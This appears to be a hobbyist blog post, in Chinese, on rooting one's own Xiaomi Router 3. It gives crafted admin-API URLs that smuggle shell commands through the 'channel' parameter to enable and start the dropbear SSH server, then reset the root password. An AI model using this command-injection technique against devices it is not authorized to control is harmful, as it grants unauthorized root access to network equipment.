---
title: 小米路由器3 获取 SSH 权限
tags:
  - SSH
  - 小米
categories:
  - 路由器
date: 2017-11-24 16:30:21
---


# 获取 SSH 权限

* 在电脑连上小米路由器3 的情况下，打开浏览器进入 192.168.31.1 小米路由器的设置页面。<!-- more -->

* 将路由器的版本升级为开发版 2.11.20 [下载](https://erocode.com/2017/11/24/ssh-mi-3/miwifi_r3_all_55ac7_2.11.20.bin)

* 升级成功后再次打开浏览器进入 192.168.31.1 后地址栏中可以看到stock的值，具体看下图

{% asset_img get_stock.png %}

* 获取 stock 值后将下面三个地址中 【STOCK-VALUE】 替换为你的 stock 值后分三次粘贴到浏览器并打开

```
http://192.168.31.1/cgi-bin/luci/;stok=【STOCK-VALUE】/api/xqnetwork/set_wifi_ap?ssid=tianbao&encryption=NONE&enctype=NONE&channel=1%3Bnvram%20set%20ssh%5Fen%3D1%3B%20nvram%20commit
http://192.168.31.1/cgi-bin/luci/;stok=【STOCK-VALUE】/api/xqnetwork/set_wifi_ap?ssid=tianbao&encryption=NONE&enctype=NONE&channel=1%3Bsed%20%2Di%20%22%3Ax%3AN%3As%2Fif%20%5C%5B%2E%2A%5C%3B%20then%5Cn%2E%2Areturn%200%5Cn%2E%2Afi%2F%23tb%2F%3Bb%20x%22%20%2Fetc%2Finit.d%2Fdropbear
http://192.168.31.1/cgi-bin/luci/;stok=【STOCK-VALUE】/api/xqnetwork/set_wifi_ap?ssid=tianbao&encryption=NONE&enctype=NONE&channel=1%3B%2Fetc%2Finit.d%2Fdropbear%20start
```
* 以上三次结果一致，具体如下。

{% asset_img stock_url.png %}

* 将下面地址中【STOCK-VALUE】替换为你的 stock 值，将【OLDPWD】替换为你的小米路由器3 的管理员密码，将【NEWPWD】改为你重新设置 SSH 连接的密码并记录。

```
http://192.168.31.1/cgi-bin/luci/;stok=【STOCK-VALUE】/api/xqsystem/set_name_password?oldPwd=【OLDPWD】&newPwd=【NEWPWD】
```

* 如果显示 {"code":0} 则表示密码修改成功！

{% asset_img stock_url_success.png %}

* 成功修改完密码后我们可以用 SSH 方式访问小米路由器了，密码为上一步设置的新密码。（如果是 Windows 系统可以使用 PuTTY，如果是 Mac OS 直接使用终端即可)

```
ssh root@192.168.31.1
```

{% asset_img ssh_mi_3.png %}